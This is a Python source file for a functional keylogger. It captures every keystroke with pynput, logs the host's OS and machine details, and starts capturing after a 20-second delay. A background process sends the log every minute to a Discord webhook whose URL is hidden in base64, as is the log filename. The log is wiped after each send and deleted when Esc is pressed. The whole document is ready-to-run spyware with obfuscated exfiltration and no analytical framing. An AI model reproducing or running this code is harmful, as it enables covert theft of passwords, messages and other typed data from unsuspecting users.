from pynput.keyboard import Listener, Key

import os
import time

import requests
import socket
import platform

import base64

from multiprocessing import Process, freeze_support

class Keylogger:
    def __init__(self, output_dir):
        """
        Args:
            output_dir for the path of the file
        """
        encoded_name = b'a2V5X2xvZy50eHQ='
        self.keys = []
        self.count = 0
        self.output_dir = output_dir
        self.filename = base64.b64decode(encoded_name).decode()
        self.log_path = os.path.join(output_dir, self.filename)

        os.makedirs(output_dir, exist_ok=True)

    def on_press(self, key):
        """
        Callback for key press
        Args:
            key corresponds to the key that was pressed
        """
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.write_to_file()
            self.reset_buffer()

    def on_release(self, key):
        """
        Callback for releasing key
        Args:
            key corresponds to the key that was released
        """
        if key == Key.esc:
            try:
                os.remove(self.log_path)
            except FileNotFoundError as e:
                pass
            return False
        return None

    def write_to_file(self):
        """Writes the keylogged keys into the log file"""
        with open(self.log_path, 'a', encoding='utf-8') as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if "space" in k:
                    f.write("\n")
                elif "Key" not in k:
                    f.write(k)

    def reset_buffer(self):
        """Resets the key buffer and counter"""
        self.keys = []
        self.count = 0

    def start(self):
        """Starts the keylogger"""
        time.sleep(20)
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

def send_log_discord(filepath):
    log_content = "No data"
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            log_content = f.read()
    except (FileNotFoundError, PermissionError, OSError) as e:
        log_content = f"[Error reading log file: {str(e)}]"

    try:
        encoded_url = b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDIxNTU2NjE2OTczOTI2NC9ydGhMempIVlRrWFlQc1VJTndLcVo0N2hvOTVyYkZvWUZSS1MxYmViZ0tRNk1kMTh2QVFGenYzMDZnMUg1eklneVUybA=='
        webhook_url = base64.b64decode(encoded_url).decode()

        requests.post(webhook_url, json={"content": f"```\n{log_content}\n```"})
        open(filepath, 'w').close()
    except requests.RequestException as e:
        pass

def periodic_sender(log_path):
    while True:
        time.sleep(60)
        send_log_discord(log_path)

def get_system_info():
    info = {}

    try:
        info["OS"] = platform.system() + " " + platform.release()
        info["OS Version"] = platform.version()
        info["Machine Name"] = socket.gethostname()
        info["Architecture"] = platform.machine()
        info["Processor"] = platform.processor()
    except Exception as e:
        info["Error"] = str(e)

    return info

def log_system_info(filepath):
    info = get_system_info()
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write("\n--- SYSTEM INFO ---\n")
        for key, value in info.items():
            f.write(f"{key}: {value}\n")
        f.write("\n")

def main():
    freeze_support()
    file_path = os.path.dirname(os.path.abspath(__file__))
    logger = Keylogger(file_path)
    sender = Process(target=periodic_sender, args=(logger.log_path,))
    sender.daemon = True
    sender.start()
    log_system_info(logger.log_path)
    logger.start()

if __name__ == "__main__":
    main()
